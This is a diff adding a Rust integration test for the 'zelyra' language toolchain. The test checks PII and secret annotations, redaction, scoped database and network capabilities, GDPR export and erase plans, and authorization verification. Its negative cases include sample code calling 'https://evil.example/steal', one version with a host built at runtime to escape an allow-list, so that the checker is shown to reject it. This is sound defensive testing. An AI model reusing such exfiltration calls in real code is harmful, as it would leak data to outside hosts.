@@ -6278,3 +6278,386 @@ fn main() {
 
     fs::remove_dir_all(directory).unwrap();
 }
+
+#[test]
+fn privacy_information_flow_scoped_capabilities_and_verified_auth_v1() {
+    let directory = temporary_directory("zelyra-170-privacy-auth");
+    fs::create_dir_all(&directory).unwrap();
+    let run = |args: &[&str]| Command::new(binary()).args(args).output().unwrap();
+
+    // 1. Positive suite: @pii/@secret/@redact, redact(), scoped capabilities, zelyra privacy, reflect, verify
+    let valid_file = directory.join("valid.zyl");
+    fs::write(
+        &valid_file,
+        r#"
+database main { engine: mariadb }
+
+type TenantId = Id
+
+struct CustomerDto {
+    id: Id
+    email: String @pii @redact
+}
+
+table users {
+    id: Id primary auto
+    email: Email required unique @pii
+    password_hash: String(255) required @secret
+    active: Bool default true
+}
+
+table auth_sessions {
+    id: Id primary auto
+    user: User required
+    token_hash: String(64) required unique @secret
+    expires_at: Timestamp required
+}
+
+table tenant_memberships {
+    id: Id primary auto
+    user_id: Int required
+    tenant_id: TenantId required
+    active: Bool required
+}
+
+table customers scoped by tenant_id: TenantId {
+    id: Id primary auto
+    tenant_id: TenantId required
+    email: String(255) required @pii @redact
+    api_key: String(128) required @secret
+    status: String(32) required default "active"
+    created_by: Id required
+    states status {
+        active -> suspended requires role("admin")
+        suspended -> approved requires four_eyes(created_by)
+        approved -> final
+    }
+}
+
+table customer_notes scoped by tenant_id: TenantId {
+    id: Id primary auto
+    tenant_id: TenantId required
+    customer_id: Id required references customers
+    note: String(200) required
+}
+
+auth AppAuth {
+    table: users
+    sessions: auth_sessions
+    memberships: tenant_memberships
+}
+
+fn log_safe(dto: CustomerDto) {
+    print(redact(dto.email))
+}
+
+fn list_customers(tid: TenantId) -> CustomerDto[] uses Database(read: [customers]) {
+    rows = sql<customers[]> {
+        WITH active AS (
+            SELECT id, email FROM customers WHERE tenant_id = :tid AND status = 'active'
+        )
+        SELECT id, email FROM active
+    }
+    return [CustomerDto { id: rows[0].id, email: rows[0].email }]
+}
+
+fn update_status(tid: TenantId, cid: Id) -> Int uses Database(write: [customers]) {
+    sql { UPDATE customers SET status = 'suspended' WHERE tenant_id = :tid AND id = :cid }
+    return 1
+}
+
+fn sync_datev(payload: String) -> String uses Network(allow: ["api.datev.de"]), FileSystem(scope: "exports/") {
+    assert_eq(redact(payload), "[REDACTED]")
+    return "ok"
+}
+
+api GET "/api/customers" {
+    requires auth
+    handler list_customers
+    input {
+        tid: TenantId
+    }
+    output CustomerDto[]
+}
+
+api POST "/api/customers/status" {
+    requires auth
+    handler update_status
+    input {
+        tid: TenantId
+        cid: Id
+    }
+    output Int
+}
+
+fn main() {
+    assert_eq(redact("alice@example.com"), "[REDACTED]")
+    print("privacy ok")
+}
+"#,
+    )
+    .unwrap();
+
+    let check_res = run(&["check", valid_file.to_str().unwrap()]);
+    assert!(
+        check_res.status.success(),
+        "stdout: {}\nstderr: {}",
+        String::from_utf8_lossy(&check_res.stdout),
+        String::from_utf8_lossy(&check_res.stderr)
+    );
+
+    let test_res = run(&["run", valid_file.to_str().unwrap()]);
+    assert!(test_res.status.success());
+    assert!(String::from_utf8_lossy(&test_res.stdout).contains("privacy ok"));
+
+    // Sensitivity annotations are supported during schema generation for both engines.
+    let postgres_file = directory.join("valid_postgres.zyl");
+    fs::write(
+        &postgres_file,
+        fs::read_to_string(&valid_file).unwrap().replace(
+            "database main { engine: mariadb }",
+            "database main { engine: postgres }",
+        ),
+    )
+    .unwrap();
+    for schema_file in [&valid_file, &postgres_file] {
+        let ddl = run(&["db", "create", schema_file.to_str().unwrap()]);
+        assert!(
+            ddl.status.success(),
+            "{}: {}",
+            schema_file.display(),
+            String::from_utf8_lossy(&ddl.stderr)
+        );
+        assert!(String::from_utf8_lossy(&ddl.stdout).contains("CREATE TABLE"));
+    }
+
+    // Verify zelyra privacy map|export-plan|erase-plan
+    let map_json_res = run(&[
+        "privacy",
+        "map",
+        valid_file.to_str().unwrap(),
+        "--format=json",
+    ]);
+    assert!(
+        map_json_res.status.success(),
+        "{}",
+        String::from_utf8_lossy(&map_json_res.stderr)
+    );
+    let map_json: serde_json::Value = serde_json::from_slice(&map_json_res.stdout).unwrap();
+    assert_eq!(map_json["evidence_class"], "PROVEN");
+    assert_eq!(map_json["legal_compliance_evidence"], "ASSUMED");
+    assert!(map_json["columns"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .any(|c| c["table"] == "customers"
+            && c["column"] == "email"
+            && c["privacy"] == "pii"
+            && c["redact"] == true));
+    assert!(map_json["external_sinks"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .any(|s| s["function"] == "sync_datev"
+            && s["capability"] == "Network(allow: [api.datev.de])"));
+
+    let export_res = run(&[
+        "privacy",
+        "export-plan",
+        valid_file.to_str().unwrap(),
+        "--format=json",
+    ]);
+    assert!(export_res.status.success());
+    let export_json: serde_json::Value = serde_json::from_slice(&export_res.stdout).unwrap();
+    assert_eq!(export_json["plan"], "gdpr_art_15_20_export");
+    assert!(!export_json["steps"].as_array().unwrap().is_empty());
+
+    let erase_res = run(&[
+        "privacy",
+        "erase-plan",
+        valid_file.to_str().unwrap(),
+        "--format=json",
+    ]);
+    assert!(erase_res.status.success());
+    let erase_json: serde_json::Value = serde_json::from_slice(&erase_res.stdout).unwrap();
+    assert_eq!(erase_json["plan"], "gdpr_art_17_erasure");
+    assert!(!erase_json["steps"].as_array().unwrap().is_empty());
+
+    // Verify zelyra verify --json emits evidence_class PROVEN for Privacy & Authorization v1
+    let verify_res = run(&["verify", valid_file.to_str().unwrap(), "--json"]);
+    assert!(
+        verify_res.status.success(),
+        "{}",
+        String::from_utf8_lossy(&verify_res.stderr)
+    );
+    let verify_json: serde_json::Value = serde_json::from_slice(&verify_res.stdout).unwrap();
+    let entries = verify_json.as_array().unwrap();
+    assert!(entries.iter().any(|e| e["kind"] == "privacy"
+        && e["status"] == "PROVEN"
+        && e["evidence_class"] == "PROVEN"));
+    assert!(entries.iter().any(|e| e["kind"] == "authorization"
+        && e["status"] == "PROVEN"
+        && e["evidence_class"] == "PROVEN"));
+
+    // Verify zelyra reflect exports privacy/redact & authorization summary
+    let reflect_res = run(&["reflect", valid_file.to_str().unwrap(), "--format=json"]);
+    assert!(reflect_res.status.success());
+    let reflect_json: serde_json::Value = serde_json::from_slice(&reflect_res.stdout).unwrap();
+    assert_eq!(reflect_json["authorization"]["auth_configured"], true);
+    assert_eq!(reflect_json["authorization"]["protected_apis"], 2);
+    assert_eq!(reflect_json["authorization"]["four_eyes_transitions"], 1);
+
+    // 2. Negative Information Flow Matrix: every leak fails with E-PRIVACY-001
+    for (name, snippet) in [
+        (
+            "secret_in_print",
+            r#"
+table k { id: Id primary auto api_key: String(64) required @secret }
+fn main() uses Database(read) {
+    rows = sql<k[]> { SELECT id, api_key FROM k }
+    print(rows[0].api_key)
+}
+"#,
+        ),
+        (
+            "secret_in_redact",
+            r#"
+fn leak(tok: String @secret) -> String { return redact(tok) }
+fn main() {}
+"#,
+        ),
+        (
+            "pii_in_print_via_concat",
+            r#"
+fn echo_helper(v: String) -> String { return "email=" + v }
+fn dump(email: String @pii) {
+    wrapped = echo_helper(email)
+    print(wrapped)
+}
+fn main() {}
+"#,
+        ),
+        (
+            "pii_on_public_api",
+            r#"
+struct PublicOut { email: String @pii }
+fn get_customers() -> PublicOut[] { return [] }
+api GET "/public" { handler get_customers output PublicOut[] }
+fn main() {}
+"#,
+        ),
+        (
+            "secret_in_err",
+            r#"
+fn fail(s: String @secret) -> Result<Int, String> {
+    return Err("failed for " + s)
+}
+fn main() {}
+"#,
+        ),
+    ] {
+        let neg = directory.join(format!("{name}.zyl"));
+        fs::write(&neg, snippet).unwrap();
+        let res = run(&["check", neg.to_str().unwrap()]);
+        assert!(!res.status.success(), "{name} should fail E-PRIVACY-001");
+        let stderr = String::from_utf8_lossy(&res.stderr);
+        assert!(stderr.contains("E-PRIVACY-001"), "{name}: {stderr}");
+    }
+
+    // 3. Negative Scoped Capability tests (static + runtime)
+    let out_of_scope_table = directory.join("bad_table_scope.zyl");
+    fs::write(
+        &out_of_scope_table,
+        r#"
+table a { id: Id primary auto }
+table b { id: Id primary auto }
+fn read_b() -> Int uses Database(read: [a]) {
+    rows = sql<b[]> { SELECT id FROM b }
+    return len(rows)
+}
+fn main() {}
+"#,
+    )
+    .unwrap();
+    let scope_res = run(&["check", out_of_scope_table.to_str().unwrap()]);
+    assert!(!scope_res.status.success());
+    assert!(String::from_utf8_lossy(&scope_res.stderr).contains("E-CAP-001"));
+
+    let out_of_scope_host = directory.join("bad_host_scope.zyl");
+    fs::write(
+        &out_of_scope_host,
+        r#"
+fn call_evil() -> String uses Network(allow: ["api.datev.de"]) {
+    return http_get("https://evil.example/steal")
+}
+fn main() {}
+"#,
+    )
+    .unwrap();
+    let host_res = run(&["check", out_of_scope_host.to_str().unwrap()]);
+    assert!(!host_res.status.success());
+    assert!(String::from_utf8_lossy(&host_res.stderr).contains("E-CAP-001"));
+
+    // Dynamic host escaping Network(allow: [...]) caught at runtime too
+    let dyn_host = directory.join("dyn_bad_host.zyl");
+    fs::write(
+        &dyn_host,
+        r#"
+fn call_host(h: String) uses Network(allow: ["api.datev.de"]) {
+    _ = http_get("https://" + h + "/steal")
+}
+fn main() uses Network(allow: ["api.datev.de"]) {
+    call_host("evil.example")
+}
+"#,
+    )
+    .unwrap();
+    let dyn_res = run(&["run", dyn_host.to_str().unwrap()]);
+    assert!(!dyn_res.status.success());
+    assert!(
+        String::from_utf8_lossy(&dyn_res.stderr).contains("outside declared `Network(allow:"),
+        "{}",
+        String::from_utf8_lossy(&dyn_res.stderr)
+    );
+
+    // 4. Negative Verified Authorization v1: unauthenticated POST Database(write) fails zelyra verify
+    let bad_auth = directory.join("bad_auth.zyl");
+    fs::write(
+        &bad_auth,
+        r#"
+table users {
+    id: Id primary auto
+    email: Email required unique
+    password_hash: String(255) required
+    active: Bool default true
+}
+table auth_sessions {
+    id: Id primary auto
+    user: User required
+    token_hash: String(64) required unique
+    expires_at: Timestamp required
+}
+table invoices { id: Id primary auto total: Int required }
+auth AppAuth { table: users sessions: auth_sessions }
+fn create_inv() -> Int uses Database(write: [invoices]) {
+    sql { INSERT INTO invoices (total) VALUES (100) }
+    return 1
+}
+api POST "/api/invoices" {
+    handler create_inv
+    output Int
+}
+fn main() {}
+"#,
+    )
+    .unwrap();
+    let bad_verify = run(&["verify", bad_auth.to_str().unwrap(), "--json"]);
+    assert!(!bad_verify.status.success());
+    assert!(
+        String::from_utf8_lossy(&bad_verify.stdout).contains("FAILED"),
+        "{}",
+        String::from_utf8_lossy(&bad_verify.stdout)
+    );
+
+    fs::remove_dir_all(directory).unwrap();
+}
